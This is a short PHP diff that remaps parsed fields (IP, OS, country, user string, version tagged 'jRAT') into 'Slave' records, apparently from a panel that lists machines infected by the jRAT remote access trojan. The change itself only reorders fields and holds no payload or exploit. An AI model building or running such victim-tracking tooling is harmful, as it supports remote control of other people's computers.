@@ -61,14 +61,14 @@ class Request {
 			
 			$s = new Slave();
 			$s->array = array(
-				"strid" => $data[0],
+				"strid" => $data[2],
 				"id" => "0",
 				"selected" => "false",
-				"country" => "se",
-				"userstring" => $data[1],
-				"os" => $data[3],
-				"ip" => $data[2],
-				"version" => $data[4],
+				"country" => $data[5],
+				"userstring" => $data[0],
+				"os" => $data[1],
+				"ip" => $data[4],
+				"version" => "jRAT " . $data[3],
 				"ping" => "",
 			);
 			array_push($slaves, $s);
